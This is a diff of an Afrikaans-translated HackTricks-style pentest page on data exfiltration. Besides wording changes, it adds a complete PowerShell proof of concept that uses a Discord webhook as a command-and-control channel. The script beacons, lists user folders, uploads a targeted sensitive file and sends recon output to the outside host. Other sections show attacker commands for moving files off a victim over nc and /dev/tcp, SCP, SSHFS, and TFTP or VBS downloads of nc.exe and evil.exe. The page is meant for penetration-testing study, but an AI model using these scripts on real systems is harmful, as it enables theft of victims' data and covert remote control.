@@ -1,12 +1,12 @@
-# Exfiltrasie
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Gewoonlik goedgekeurde domeine om inligting te onttrek
+## Algemeen whitelisted domeine om inligting te exfiltrate
 
-Kyk na [https://lots-project.com/](https://lots-project.com/) om gewoonlik goedgekeurde domeine te vind wat misbruik kan word
+Kyk na [https://lots-project.com/](https://lots-project.com/) om algemeen whitelisted domeine te vind wat misbruik kan word
 
-## Kopieer\&Plak Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -45,8 +45,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Laai lêers op
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer wat GET en POSTs (ook koptekste) druk**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python module [uploadserver](https://pypi.org/project/uploadserver/):
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python-moduul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -59,7 +59,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Bediener**
+### **HTTPS-bediener**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,9 +100,94 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) vir C2 & Data Exfiltration
+
+Webhooks is write-only HTTPS-endpunte wat JSON en opsionele file parts aanvaar. Hulle word gewoonlik toegelaat na vertroude SaaS-domeine en vereis geen OAuth/API keys nie, wat dit nuttig maak vir low-friction beaconing en exfiltration.
+
+Belangrike idees:
+- Eindpunt: Discord gebruik https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator-luspatroon: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bevestig aflewering.
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+Aantekeninge:
+- Soortgelyke patrone geld vir ander samewerkingsplatforms (Slack/Teams) wat hul incoming webhooks gebruik; pas URL en JSON schema dienooreenkomstig aan.
+- Vir DFIR van Discord Desktop cache artifacts en webhook/API recovery, sien:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
-### FTP bediener (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -112,7 +197,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP bediener (pure-ftp)
+### FTP-bediener (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -150,7 +235,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb deel **met behulp van samba**:
+Of skep 'n smb share **met samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Die aanvaller moet SSHd aan die gang hê.
+Die aanvaller moet SSHd laat loop.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-As die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller monteer.
+As die victim SSH het, kan die attacker 'n gids van die victim na die attacker mount.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,12 +279,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Laai lêer af van slagoffer
+### Laai lêer vanaf victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Laai lêer na slagoffer op
+### Lêer na die slagoffer oplaai
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -228,15 +313,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-As jy data na 'n SMTP-bediener kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
+As jy data na 'n SMTP server kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Standaard in XP en 2003 (in ander moet dit eksplisiet tydens installasie bygevoeg word)
+Standaard in XP en 2003 (in ander moet dit tydens installasie uitdruklik bygevoeg word)
 
-In Kali, **begin TFTP bediener**:
+In Kali, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -248,7 +333,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **slagoffer**, verbind met die Kali-bediener:
+In **slagoffer**, koppel aan die Kali-server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -262,7 +347,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**Slachtoffer**
+**Slagoffer**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -296,18 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program laat nie net inspeksie van binêre toe nie, maar het ook die **vermoë om hulle uit hex te herbou**. Dit beteken dat deur 'n hex van 'n binêre te verskaf, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om te noem dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te monteer**.
+Die `debug.exe`-program laat nie net inspeksie van binaries toe nie, maar het ook die **vermoë om dit vanaf hex te herbou**. Dit beteken dat deur 'n hex van 'n binary te verskaf, kan `debug.exe` die binary-lêer genereer. Dit is egter belangrik om te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Dan kopieer-plak die teks in die windows-shell en 'n lêer genaamd nc.exe sal geskep word.
+Kopieer en plak dan die teks in die windows-shell en 'n lêer met die naam nc.exe sal geskep word.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## Verwysings
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
